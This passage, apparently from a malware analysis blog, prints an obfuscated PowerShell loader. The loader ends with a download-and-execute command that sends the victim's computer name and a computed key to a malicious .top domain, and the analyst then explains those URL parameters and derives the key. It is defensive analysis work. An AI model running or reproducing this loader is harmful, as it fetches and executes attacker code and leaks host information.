(523118/(7371-205)),(458150/(14145-(8616+(5676-4312)))),(776156/(7000-(841-532))),(7081-6980),(-6337+6440),(-2507+2621),(-9363+(6650+2810)),(983332/(6053+(-1879+4303))),(909808/(35977952/(5726-(9611-(1126697/143))))),(-629+729))))} {$cvjqdh+= ((1320603945-1640)-((40286336928/(18003-(16863208/1858)))/(2716-(-9060+(18500-(5795+2550)))))); break; }
}
$cvjqdh+= ((442268688+4743)+(3552+(12901-(16396-(19411947/2297)))))
$cvjqdh+= ((12451892951840/6584)-(25582575/8675))
$uapncrzxdqkl=(Get-WmiObject -Namespace $global:cijpehml.([system.String]::new(@((-1761+1866),(4335-4225),(8743-(-1008+9633)),(7460-7349),(4527-4420),(961520/9520),(1754-(-1332+2987)),(-5047+5158),(791885/7265),(3481-(10317-6945)),(688-(6240-5649)),(940500/8550),(773500/(8469-734))))).([char[]]@((237754/2354),(3816-3696),(-7414+7526),(805100/(3230+5070)),(9300-9190),(-7919+(10814-(10821-8026))),(1160695/(5624+4469)),(-8235+8351),(-6149+6263),(-7394+(13573-(873+5201))),(-2984+3094),(3459-3356)) -join '')([char[]]@( (331968/(9838-6926)),(-5170+5281),(3555-(171+3273)),(-7390+7506),(-1760+(5762-3910)),(495516/4164),(903937/8293),(556710/5302)) -join '') -Query $global:cijpehml.([char[]]@((-2487+2592),(51920/472),(670830/(-59+5744)),(-7708+7819),(67196/628),(692961/6861),(-10088+(12088-(13236663/6963))),(129648/1168),(3051-(10004-7062)),(-9682+9791),(-3925+4022),(78760/(2932020/(2122+(8372-6399)))),(7536-7436)) -join '').([system.String]::new(@((9452-9351),(-2260+(11636-(51444848/5558))),(8614-(7116174/(1605366/(-2276+(24627168/5872))))),(4001-3904),(607200/5520),(-9799+(7203+(-5682+8378))),(-3982+4097),(-3927+4043),(721506/(7215-(8726214/(34244973/3477)))),(-4212+4317),(3066-(10462-(12719-(-191+5404)))),(240299/2333))))(-join (@( (738-(5744350/8770)),(8249-(9101-921)),(-5733+5809),(5128-5059),(-657+(6066-5342)),(110544/1316),(296992/9281),(7949-(11061-3154)),(279296/8728),(-1186+1256),(21+(1239-(8631-7453))),(2018-1939),(4359-(409+3873)),(-1008+(-5588+6628)),(541-(-5340+(-4324+10128))),(2520-2437),(-2498+2581),(-5996+6105),(547404/(32636890/(-958+4893))),(-5978+6083),(-9848+9959),(-2757+(-6415+9287)),(123310/(1856-558)),(3246-(901740/285)),(-7705+7802),(-8216+(78182300/9380)),(427118/(26759200/(29343600/5643))),(139755/(11834-10019)),(255-189),(-4047+4152),(345099/3109),(798675/6945),(7642-7558),(1025-928),(876512/8944),(1090368/(7255+(14330004/5044))),(8999-8898),(1556-(2848857/1977)))| ForEach-Object { [char]$_ }))).($global:cijpehml.([char[]]@((1027530/(58216914/(10429-4480))),(972950/(80365670/9086)),(1173746/9947),(-6817+6928),(8619-(12061-(582+2967))),(9688-(85746128/(6269+(8418-(-3071+(18361-(7933+1614))))))),(-8661+8760),(672216/6056),(-8547+(9699-(4940-(13075-9178)))),(6240-(6414-283)),(872-775),(8070-(957+(907+6096))),(-2967+3067)) -join '').([char[]]@((2029-1928),(441240/(9700-(45925375/(50157250/6578)))),(201040/(15654195/(10998-2277))),(3989-3892),(1797-1687),(-1064+(155+(10568-(4844+4715)))),(1867-1752),(3495-(4250-871)),(174876/1534),(586635/5587),(2003-1893),(771985/7495)) -join '')(-join (@( (-9132+9215),(-382+(5848-5389)),(426-(2116800/(15593-9713))),(3347-(12316-9074)),(-3377+3488),(921840/8016),(-3856+(2676+1248)),(-2665+(9522-(16840-10080))),(8088-(12568-4596)),(-1198+(8526-7231)))| ForEach-Object { [char]$_ }))).($global:cijpehml.([char[]]@((-1481+(2452-(-9040+(10155-(1752462/7038))))),(-5848+(15234-(32336136/3486))),(8122-(13087-5083)),(48174/434),(-7589+7696),(-5395+(6298416/1146)),(126225/(60+(2731-(2271-755)))),(68598/618),(-7406+7515),(643209/5901),(5324-5227),(-2878+2988),(-6647+6747)) -join '').(-join (@((615797/(13355-(3449+(13270556/(1727+1757))))),(231120/(-247+(-802+2975))),(18368/(-1034+1198)),(965926/(13271-(-3488+6801))),(-5131+5241),(456800/4568),(-5450+5565),(-8258+(16162-7788)),(985872/8648),(-1967+2072),(6437-(-1128+7455)),(2464-(9806-(-1645+9090))))| ForEach-Object { [char]$_ }))([char[]]@( (9148-9040),(823655/8155),(8429-(11757-(4163418/(7588126/(818+(-1313+6761)))))),(1032369/10023),(1172064/(50267400/4975)),(-2812+(7995-5079))) -join ''))
switch($true){
        {$uapncrzxdqkl -le ((2033-(4873+762))+(236+4366)) -and $uapncrzxdqkl -gt ((-4943+423)+(-4138+8958))} {$cvjqdh+=((381582059701379-1726)/((45840237490/2458)/((17820-(12671-(30126668/3398)))-((19429-(-6920+9332))-(3408+3979))))); break; }
        {$uapncrzxdqkl -le ((117871+4313)+(8398-(69434200/(-1546+(99399740/(19113-9248)))))) -and $uapncrzxdqkl -gt ((136481330/(14459-5713))-(10904530/(30423848/7268)))} {$cvjqdh+= ((193555631551950/10170)+((3877093+(-166+804))/(5146-(7636005/(7689591/3731))))); break; }
        {$uapncrzxdqkl -le ((73467159-(2065+1094))/(-3092+9214)) -and $uapncrzxdqkl -gt ((8498525+(30528450/3222))/((9231-7814)+(3538409/499)))} {$cvjqdh+= ((1606018388+(7651-(7076855/(-2573+3790))))-((2439-6080)+((225058853925/(10120-4281))/(-3123+7926)))); break; }
}



iex(curl -useb "http://euuvua3.top/2.php?id=$env:computername&key=$cvjqdh")
```

We get the domain for the second stage payload: "euuvua3[.]top" as well as some URL arguments, the first is the hostname of the endpoint: "id=$env:computername".

The second is a key, which is defined in the output of the deobfuscated script: "key=$cvjqdh"

"$cvjqdh+= ((1606018388+(7651-(7076855/(-2573+3790))))-((2439-6080)+((225058853925/(10120-4281))/(-3123+7926))))"

We can then use PowerShell again to define and call this variable to get the key value: "1606015840"

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/0a348dda-bc2f-4223-aaa5-20464c905f40)







